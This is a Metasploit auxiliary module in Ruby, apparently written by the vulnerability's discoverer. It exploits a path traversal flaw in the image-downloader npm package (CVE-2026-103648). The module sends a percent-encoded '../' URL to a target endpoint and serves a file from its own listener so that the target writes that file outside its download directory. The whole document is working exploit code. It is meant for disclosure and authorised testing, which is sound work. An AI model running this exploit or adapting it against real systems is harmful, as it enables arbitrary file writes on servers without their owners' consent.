##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer

  # Configures module metadata and the endpoint and traversal options.
  #
  # @param info [Hash] module metadata
  # @return [void]
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'image-downloader npm Package Path Traversal (Arbitrary File Write)',
        'Description' => %q{
          This module exploits a path traversal vulnerability (CVE-2026-103648) in the
          image-downloader npm package prior to version 4.3.1. Any application that calls
          download.image({ url, dest }) with a URL it does not fully control (user-submitted
          image imports, webhook payloads, content feed entries) is vulnerable.

          The library's filename-extraction logic calls path.basename() on the still
          percent-encoded URL pathname before decodeURIComponent() runs on it. A sequence
          such as %2e%2e%2f contains no literal '/' at extraction time, so it survives
          basename() unchanged; decodeURIComponent() is only applied afterward, turning it
          into a literal '../', which path.join() then normalizes to a path outside the
          configured destination directory.

          This module sends the target a URL containing a percent-encoded traversal sequence
          and serves a callback response. A matching callback token shows that a request
          containing this run's token reached the listener; it does not prove that the target
          made the request, that it is vulnerable, or that a file was written
          outside its download directory. Confirming the final write location requires local
          access to the target. The path resolved by the target depends on its configured
          download directory and the DEPTH option; the documented /tmp/pwned_by_msf.txt path
          applies to the referenced lab configuration.
        },
        'Author' => [
          'Amirhossein Roustaei (EterNullSec)' # Discovery and Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-103648'],
          ['URL', 'https://eternull.net/posts/cve-2026-103648-image-downloader-path-traversal'],
          ['URL', 'https://github.com/EterNullSec/CVE-2026-103648'],
          ['URL', 'https://gitlab.com/demsking/image-downloader/-/commit/fb4454304276e2439fb19b98836b3ba903b3aaea']
        ],
        'DisclosureDate' => '2026-10-02',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(3000),
        OptString.new('TARGETURI', [true, 'Path to the endpoint that triggers download.image()', '/download']),
        OptString.new('URLPARAM', [true, 'Query param the endpoint reads the attacker URL from', 'url']),
        OptInt.new('DEPTH', [true, 'Number of ../ traversal levels to encode', 2]),
        OptString.new('FILENAME', [true, 'Filename written after the traversal sequence', 'pwned_by_msf.txt']),
        OptInt.new('CALLBACK_TIMEOUT', [true, 'Seconds to wait for the target to fetch the payload', 15])
      ]
    )
  end

  # Starts the callback listener and sends the traversal test request.
  # A matching callback is evidence of a request, not proof of a file write.
  #
  # @return [void]
  def run
    @callback_correlated = false
    @callback_token = Rex::Text.rand_text_alphanumeric(32)
    payload_content = "CVE-2026-103648 | image-downloader path traversal | #{Rex::Text.rand_text_alpha(8)}\n"

    start_service(
      'Uri' => {
        'Proc' => proc do |cli, req|
          on_payload_request(cli, req, payload_content)
        end,
        'Path' => '/'
      }
    )
    print_status("Started payload listener on #{Rex::Socket.to_authority(srvhost_addr, srvport)}")

    callback_url = build_callback_url
    safe_callback_url = callback_url.sub("?msf_callback=#{@callback_token}", '?msf_callback=[redacted]')
    print_status("Callback URL: #{safe_callback_url}")

    traversal_path = build_traversal_path
    print_status("Triggering #{normalize_uri(target_uri.path)} with traversal payload: #{traversal_path}")

    send_trigger(callback_url)
    wait_for_callback(datastore['CALLBACK_TIMEOUT'])

    if @callback_correlated
      print_good('Received a callback request correlated to this run.')
      print_warning('The request source is not authenticated; this does not confirm the target made the request.')
      print_warning('Verify the final file location locally on the target before treating it as vulnerable.')
    else
      print_error('No callback received. Target may not be vulnerable, may not reach ' \
                   "#{Rex::Socket.to_authority(srvhost_addr, srvport)}, or TARGETURI/URLPARAM may be wrong.")
    end
  end

  # Builds the percent-encoded traversal path sent to the target.
  #
  # @return [String] encoded URL path
  def build_traversal_path
    traversal = (['%2e%2e'] * datastore['DEPTH']).join('%2f')
    "/#{traversal}%2ftmp%2f#{datastore['FILENAME']}"
  end

  # Builds a callback URL with a per-run token for request correlation.
  # The token correlates a request with this run but does not authenticate its source.
  #
  # @return [String] callback URL
  def build_callback_url
    scheme = http_server_ssl ? 'https' : 'http'
    authority = Rex::Socket.to_authority(srvhost_addr, srvport)
    callback_path = "#{build_traversal_path}?msf_callback=#{@callback_token}"
    "#{scheme}://#{authority}#{callback_path}"
  end

  # Sends the configured endpoint the callback URL.
  #
  # @param callback_url [String] URL for the listener response
  # @return [Rex::Proto::Http::Response, nil] endpoint response, if any
  def send_trigger(callback_url)
    send_request_cgi(
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET',
      'vars_get' => {
        datastore['URLPARAM'] => callback_url
      }
    )
  end

  # Waits until this run's callback token is received or the timeout expires.
  #
  # @param timeout [Integer] maximum wait in seconds
  # @return [void]
  def wait_for_callback(timeout)
    deadline = Time.now + timeout
    sleep(0.5) until @callback_correlated || Time.now > deadline
  end

  # Handles callback listener requests and accepts only the current run's token.
  # The token does not authenticate the network client that sent the request.
  #
  # @param cli listener connection
  # @param req incoming listener request
  # @param payload_content response body for a matching callback request
  # @return [void]
  def on_payload_request(cli, req, payload_content)
    request_query = req.uri.to_s.split('?', 2)[1]
    unless request_query == "msf_callback=#{@callback_token}"
      print_warning("Ignored callback listener request without this run token.")
      return send_not_found(cli)
    end

    request_path = req.uri.to_s.split('?', 2)[0]
    print_status("Received run-correlated callback from #{cli.peerhost} - #{req.method} #{request_path}")
    @callback_correlated = true
    send_response(cli, payload_content, { 'Content-Type' => 'text/plain' })
  end
end
